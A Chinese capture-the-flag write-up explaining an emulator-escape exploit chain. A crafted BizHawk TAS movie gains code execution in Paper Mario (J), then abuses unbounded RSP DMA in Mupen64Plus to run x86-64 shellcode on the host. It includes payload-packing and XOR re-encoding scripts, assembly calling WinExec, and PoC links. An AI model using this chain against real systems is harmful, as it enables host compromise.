# NepCTF2026 T.A.S.P.W.N Writeup

## 题目简述

这是一道 REALWORLD/Pwn 展示题。选手需要提交 BizHawk 的 TAS 影片文件 `.bk2`，由工作人员在 Windows 10、BizHawk 2.9.1 和 `Mario Story (J) [!].n64` 上播放；影片结束后若宿主执行 `calc.exe`，即视为挑战成功。题面指定的 ROM SHA1 为 `B9CCA3FF260B9FF427D981626B82F96DE73586D3`，影片播放时间不得超过 20 分钟。

攻击面并不在 `.bk2` 的 ZIP 解析逻辑，而是两层执行链的组合：

1. TAS 输入在原版《纸片马里奥》日版中触发游戏内任意代码执行，获得 N64 guest MIPS 代码执行能力；
2. guest 操纵 Mupen64Plus 的 RSP DMA 寄存器，利用宿主缓冲区索引缺少边界约束的问题越界读写，最终在 EmuHawk 宿主进程中执行 x86-64 代码。

[TASVideos 的 `bluescreen%` 提交记录](https://tasvideos.org/8982S)给出了可直接复用的基础影片：目标同为 `Mario Story (J) [!]`，模拟器为 BizHawk 2.9.1，共 55345 帧。该影片因能逃逸模拟器沙箱并在 Windows 10 虚拟机中触发蓝屏而被拒绝发布，正好证明了 guest 到 host 的完整执行链。本题只需把原宿主 payload 从蓝屏逻辑改为 `WinExec("calc", 1)`。

最终 flag 为：

```text
NepCTF{You_Control_THE_Swarm_By_TASPLAY!Who_tells_them_there_is_a_problem_with_their_AI_3}
```

## 解题过程

### 1. 确认模拟器逃逸原语

[BizHawk #3929](https://github.com/TASEmulators/BizHawk/issues/3929)明确说明，BizHawk 2.9.1 及更早版本附带的 Mupen64Plus core 允许恶意 N64 代码写入宿主可执行内存并执行任意代码；Ares64 core 不受影响，该问题在 BizHawk 2.10 中修复。

上游的 [mupen64plus-core #1081](https://github.com/mupen64plus/mupen64plus-core/issues/1081)进一步指出了 RSP DMA 的危险读写：

```c
dram[dramaddr ^ S8] = spmem[memaddr ^ S8];
spmem[memaddr ^ S8] = dram[dramaddr ^ S8];
```

旧实现虽然对初始寄存器值做了掩码，但 DMA 循环中的 `dramaddr` 和 `memaddr` 继续递增时没有按真实的 RDRAM、SPMEM 大小回绕。guest 因而可以让 DMA 越过模拟内存边界，读写 EmuHawk 进程地址空间。题目的决定性原语是模拟器宿主越界读写和代码执行，所以应归入 Pwn，而不是普通游戏逆向。

### 2. 解析基础影片尾段

`.bk2` 本质上是 ZIP，关键成员包括：

```text
Header.txt
Comments.txt
Subtitles.txt
SyncSettings.json
Input Log.txt
```

`Input Log.txt` 按帧保存四个控制器的摇杆坐标和按键状态。基础影片在第 55293 至 55343 帧使用四个控制器传入最终载荷，共 51 帧；每帧抽取 12 字节，因此尾段可以重组为 $51 \times 12 = 612$ 字节：

```python
def pack12(p1, p2, p3, p4):
    return bytes([
        p4["x"], p4["y"],
        p2["x"], p2["y"],
        p3["bits"] >> 8, p2["bits"] >> 8,
        p3["x"], p3["y"],
        p1["bits"] >> 8, p4["bits"] >> 8,
        p1["x"], p1["y"],
    ])
```

重组后的缓冲区被写入 guest RDRAM `0x807fc000`，布局为：

```text
偏移 0x000，长度 312：guest MIPS 阶段，负责 OOB PI DMA 和宿主 body 解码
偏移 0x138，长度 204：宿主 blob
偏移 0x204，长度  96：后续 guest MIPS 辅助代码
```

宿主 blob 的结构如下：

```text
header(8) | "HIMITSU!"(8) | body(184) | trailer(4)
```

其中 `body` 才是要替换的宿主 x86-64 载荷。`HIMITSU!` 和尾部 `38 06 00 03` 可以作为定位与完整性检查，guest MIPS 阶段及其 XOR 解码循环必须保持不变。

### 3. 将蓝屏 payload 改为启动计算器

解密后的 184 字节 body 仍不是按执行顺序存放的：逻辑 x86-64 代码需要对整个 body 做字节反转，入口位于逻辑 body 的 `+4`。原载荷后半段包含一个通过 PEB 遍历和导出表查找 API 的位置无关解析器，可以原样复用，只替换前面的调用逻辑。

新的逻辑 payload 完成以下操作：

```asm
sub rsp, 0x28
lea rcx, [rel winexec_name]
call api_resolver
lea rcx, [rel calc_name]
mov edx, 1
call rax
hang:
    jmp hang

winexec_name:
    db "WinExec", 0
calc_name:
    db "calc", 0
```

`sub rsp, 0x28` 为 Windows x64 调用约定预留 shadow space 并维持栈对齐。解析器返回 `WinExec` 地址后，`rcx` 指向 `"calc"`，`edx=1` 表示显示窗口。执行成功后停在死循环，避免继续落入原来的 `NtRaiseHardError` 蓝屏路径。

### 4. 保留 XOR 密钥流并替换 body

guest 会在交给宿主执行前对 184 字节 body 做分组 XOR。公开基础影片同时给出了原密文和已还原的原逻辑 payload，因此不必重新逆向 guest 的完整密钥迭代算法，可以直接恢复该影片对应的稳定密钥流。

设 `Rev()` 表示整个 184 字节串的字节反转，`C_old` 是影片中的原 body 密文，`P_old` 是原逻辑 x86-64 载荷，则密钥流为：

$K = C_{old} \oplus Rev(P_{old})$

构造新的逻辑载荷 `P_new` 后，写回影片的 body 为：

$C_{new} = Rev(P_{new}) \oplus K$

对应的核心代码如下：

```python
BODY_LEN = 184

def replace_host_body(old_ciphertext, old_logical, new_logical):
    if not (
        len(old_ciphertext)
        == len(old_logical)
        == len(new_logical)
        == BODY_LEN
    ):
        raise ValueError("unexpected host body length")

    old_plaintext = old_logical[::-1]
    keystream = bytes(
        c ^ p for c, p in zip(old_ciphertext, old_plaintext)
    )
    new_plaintext = new_logical[::-1]
    return bytes(
        p ^ k for p, k in zip(new_plaintext, keystream)
    )
```

只把新密文写入重组流的 `312 + 16` 至 `312 + 16 + 184` 区间，然后按相反顺序把每 12 字节重新编码回对应帧的四控制器状态。低位按键中还包含同步信息，更新高位载荷字节时应保留原低位，不能整行覆盖。

### 5. 重建与验证

公开复现仓库提供了[固定提交版本的完整构建脚本](https://github.com/fjh1997/nepctf2026-writeup/blob/67d4aa5157bbf4fd9b7275b6611b5b15fdd30637/work/42/tools/build_calc_bk2.py)。其调用方式为：

```bash
python3 build_calc_bk2.py \
  --src bluescreen_orig.bk2 \
  --out calc_show.bk2
```

构建后至少应检查：

1. 影片仍有 55345 帧；
2. 重组流仍为 612 字节；
3. `HIMITSU!`、trailer 和 guest XOR 循环未被破坏；
4. 新的逻辑 shellcode 与 body 均为 184 字节；
5. 从输出影片再次提取 body，结果与预期新密文一致。

对公开 PoC 进行静态重建时，虽然外层 ZIP 大小会因压缩时间戳而变化，但 `Header.txt`、`Comments.txt`、`Subtitles.txt`、`SyncSettings.json` 和 `Input Log.txt` 五个成员的 SHA256 均与交付影片一致，说明构建过程可重复。

同一仓库的[验收记录与 PoC](https://github.com/fjh1997/nepctf2026-writeup/tree/67d4aa5157bbf4fd9b7275b6611b5b15fdd30637/work/42)记录了 Windows 10、BizHawk 2.9.1、Mupen64Plus core 上的动态结果：影片在第 55345 帧结束，并启动 `CalculatorApp.exe`。由于原 `bluescreen_orig.bk2` 会在脆弱版本上执行宿主蓝屏代码，任何动态验证都必须放在可回滚的 Windows 虚拟机中；静态解析或重建不需要播放原影片。

## 方法总结

本题的完整利用链是“游戏内 ACE → 模拟器 RSP DMA 越界读写 → 宿主 x86-64 代码执行”。TAS 影片只是向原版游戏稳定输送 guest 代码和数据的载体，真正跨越安全边界的是 BizHawk 2.9.1 所用 Mupen64Plus core 的 DMA 边界检查缺失。

改造公开 `bluescreen%` 比从零重录 55 千余帧更可靠：保留已验证的游戏内 ACE、guest MIPS 阶段、宿主 API 解析器和 XOR 密钥流，只把 184 字节逻辑 body 的调用目标从蓝屏 API 换成 `WinExec("calc", 1)`。同时必须尊重“逻辑 payload 整体反转后再 XOR”的编码顺序，否则即使 shellcode 本身正确，宿主执行时也只会得到乱码。

最后，修复版本同样是复现边界的一部分：BizHawk 2.10 已修复该问题，题目必须使用指定的 2.9.1 环境。涉及模拟器逃逸的恶意 TAS 不应在日常宿主系统中直接播放。
